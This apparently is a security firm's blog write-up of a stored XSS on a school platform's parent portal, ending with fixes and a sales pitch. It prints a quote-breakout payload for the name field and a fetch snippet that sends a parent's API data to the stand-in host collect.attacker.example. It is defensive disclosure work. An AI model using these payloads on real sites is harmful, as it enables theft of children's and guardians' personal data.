---
title: "Stored XSS to ATO: A Support Widget Handed Me Every Parent's Account"
date: August 2026
source: https://blog.imperonlabs.com/blog/stored-xss-to-account-takeover-support-widget.html
---

Web · XSS

# Stored XSS to ATO: A Support Widget Handed Me Every Parent's Account

By Imperonlabs Research · August 2026 · 12 min read

The bug was not in a URL, a redirect, or an upload. It was in a parent's own name. A help widget took that name, glued it into the text of an inline script, and let the browser run whatever came out. On its own that is a self-XSS, the least interesting bug on the board. Two other facts turned it into account takeover across a whole school district.

**Scope note.** This is a sanitized account of a real engagement on a K12 education platform. Domains, field values, and payloads are examples. Nothing here targets a live system.

The platform had two faces on one backend. Parents logged into a stripped down portal that showed only their own child. Staff logged into a fuller console with role based access. The team had done the obvious things right: session cookies were `HttpOnly`, object level authorization was in place, and there was a Content Security Policy on the responses. On paper this is a hard target. In practice the interesting question is never what they got right. It is which control quietly does nothing.

## Reading the bundle, not the page

Client side bugs live in the JavaScript, so I start there before I touch the UI. I pulled the parent app's bundle and grepped the usual sinks: `innerHTML`, `document.write`, `eval`, `dangerouslySetInnerHTML`, and any string that gets built with `+` and then handed to the DOM. Minification hides intent from a reader skimming the page. It hides nothing from a search across the source.

The Help widget's init code was the hit. Cleaned up, it looked like this:

```
var s = document.createElement('script');
s.innerHTML = "SupportWidget('identify','ticketForm',{name:'" + e.name + "',email:'" + e.email + "'})";
document.body.appendChild(s);
```

The developer wanted to pass the current user's name and email to a third party support widget. Reasonable feature. The problem is that `e.name` and `e.email` are user controlled, and they are concatenated straight into the text of a script element that is then appended to the page and executed. There is no encoding between the profile field and code execution. Whatever a parent types into their name becomes part of a program.

## The seatbelt that was unbuckled

A CSP should make an injected inline script inert. So I checked what the policy actually said on the parent routes:

```
content-security-policy: default-src 'self'; script-src 'self'
  https://analytics.example-cdn.com https://widget.example-support.com 'unsafe-inline';
```

There it is. `'unsafe-inline'` on `script-src` tells the browser to trust inline scripts, which is exactly the class of script this sink produces. The header was present, it looked like a control, and it protected nothing on the route that needed it. The staff console, tested for contrast, used a strict hash based policy and passed the widget its data as a proper object argument. Same company, same widget, one route hardened and one route wide open. A control being correct somewhere else does not make it correct here.

## Breaking out of the string

The injection point is a single quoted string inside an object literal inside a function call. To run my own code I close all of that cleanly and comment out the trailing remains so the parser stays happy. The value I stored in the guardian profile's name field:

```
x'});alert(document.domain);//
```

After the app interpolates it, the browser receives:

```
SupportWidget('identify','ticketForm',{name:'x'});alert(document.domain);//',email:'[email protected]'})
```

Piece by piece: `x` is a harmless value for the name, the first `'` closes the string the app opened, `});` closes the object and the function call, `alert(document.domain)` is my code, and `//` comments out the original tail so there is no syntax error. The payload is stored, not reflected, so it does not fire from a crafted link. It fires every time a parent opens the Help button, from the database, on their own session.

From one seeded field to a district wide takeover

1 Staff writes payload
into many parents' name fields

2 Parent opens Help
inline script runs in their origin

3 Script calls the API
browser attaches HttpOnly cookie

4 Data leaves
child records, guardian PII, settings

5 Attacker collects
one seed, whole population

The vulnerable field is written by one actor and executed in another's session. That gap is what turns a self-XSS into a breach.

## Why HttpOnly bought them nothing

The session cookie was `HttpOnly`, so my script could not read `document.cookie`. That does not matter, and this is the part triagers sometimes miss. My code runs inside the application's own origin as the authenticated parent. I do not need to steal the cookie, because the browser attaches it to every same origin request for me. So I just ask the API for the data and ship it out:

```
fetch('/api/reading_logs/entries?child_id=self',{credentials:'include'})
  .then(r=>r.text())
  .then(t=>fetch('https://collect.attacker.example/x',{method:'POST',body:t}))
```

`HttpOnly` protects the cookie's value from JavaScript. It does nothing about JavaScript that acts through the cookie. Reading logs, guardian personal details, delivery settings, and the account modification endpoints were all reachable this way, on behalf of every parent who opened Help.

## Turning self-XSS into account takeover

Left there, this is a bug a parent can only use against themselves. The escalation came from one authorization question I always ask about any writable field: who else can write to it? On this platform, mid level staff accounts could edit guardian profiles. That means a single malicious or compromised staff account could plant the payload into any number of parent records at once. The trigger is the parent's own routine click on Help. One seed operation, an entire district's parent population running my code in their sessions. That is the difference between a Low and a Critical, and it is the whole report.

## How to fix it properly

There are three fixes and they stack. First, kill the sink. The widget accepts a real object, so pass one instead of building a string:

```
SupportWidget('identify', 'ticketForm', { name: e.name, email: e.email });
```

Treat any user value flowing into `innerHTML` as radioactive, and prefer `textContent` and structured DOM APIs everywhere else. Second, fix the CSP on the parent routes to match the staff console: a hash or nonce based `script-src` with `'unsafe-inline'` removed entirely, so a future sink cannot execute even if one slips in. Third, add a regression test that stores a quote breakout payload in profile fields and asserts that no script runs, so this exact bug cannot come back quietly.

## How to approach this class of bug

1. Grep the bundle for DOM sinks before you test the UI. Minification hides the code from a reader, not from a search.
2. Read the CSP as an attacker, not as a checkbox. Find the directive that makes the sink harmless, and confirm it is actually there on the route that matters.
3. For any writable field, ask who else can write to it. That answer decides whether you have a self-XSS or a one to many attack.
4. When the cookie is HttpOnly, stop trying to read it and start acting through it. Same origin fetches carry it for you.
5. Write the report as a chain, from the stored field to the exfiltrated record, with the response in hand.

The one line to remember
A field a low privilege user writes and a high privilege user renders is a privilege escalation channel, no matter how good your access control is. Encode the output, not just the input.

### Do you know which of your fields one role writes and another role renders?

Imperonlabs reads your bundles, your headers, and your authorization model together, then chains the gaps the way a real attacker would. Book a scoping call and we will map where your controls only look like controls.

[Request an assessment](https://imperonlabs.com/#contact)
